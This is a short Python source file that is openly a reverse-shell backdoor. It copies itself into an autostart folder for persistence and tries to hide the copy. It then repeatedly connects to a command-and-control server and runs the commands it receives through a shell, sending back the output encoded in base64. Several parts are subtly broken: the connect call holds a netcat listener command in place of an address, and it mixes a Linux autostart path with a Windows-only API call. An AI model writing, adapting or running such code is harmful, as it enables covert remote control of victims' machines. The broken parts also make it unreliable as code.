import socket
import subprocess
import os
import sys
import base64
import ctypes
import shutil

def persistence():
    if not os.path.exists(os.path.expanduser("~/.config/autostart")):
        os.makedirs(os.path.expanduser("~/.config/autostart"))
    shutil.copyfile(sys.argv[0], os.path.expanduser("~/.config/autostart/update.desktop"))
    ctypes.windll.kernel32.SetFileAttributesW(os.path.expanduser("~/.config/autostart/update.desktop"), 2)

def encrypt(data):
    return base64.b64encode(data.encode()).decode()

def decrypt(data):
    return base64.b64decode(data.encode()).decode()

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((nc -lvnp 4444))  # Replace with your C2 server IP
            while True:
                cmd = decrypt(s.recv(1024))
                if cmd == "exit":
                    s.close()
                    sys.exit()
                elif cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    s.send(encrypt("[+] Changed dir"))
                else:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                    s.send(encrypt(output.decode()))
        except:
            connect()

if __name__ == "__main__":
    persistence()
    connect()
